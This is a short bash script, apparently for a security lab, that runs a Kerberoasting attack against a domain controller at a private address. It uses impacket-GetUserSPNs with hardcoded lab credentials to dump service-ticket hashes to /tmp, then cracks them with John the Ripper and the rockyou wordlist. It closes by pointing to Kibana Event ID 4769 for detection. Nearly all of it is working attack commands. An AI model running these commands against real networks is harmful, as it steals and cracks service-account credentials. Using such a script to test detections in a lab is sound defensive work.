#!/bin/bash
# Attack Simulation: Kerberoasting
# MITRE ATT&CK: T1558.003
# Usage: ./kerberoasting.sh
# Requirements: impacket installed on Kali

DC_IP="192.168.50.86"
DOMAIN="lab.local"
USERNAME="jsmith"
PASSWORD="Password123!"

echo "[*] Syncing time with DC to avoid clock skew..."
sudo ntpdate $DC_IP

echo "[*] Executing Kerberoasting attack against $DC_IP"
impacket-GetUserSPNs ${DOMAIN}/${USERNAME}:${PASSWORD} -dc-ip $DC_IP -request -outputfile /tmp/kerberoast_hashes.txt

echo "[*] Attempting to crack hashes..."
john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/kerberoast_hashes.txt

echo "[*] Attack complete - check Kibana for Event ID 4769 with TicketEncryptionType 0x17"
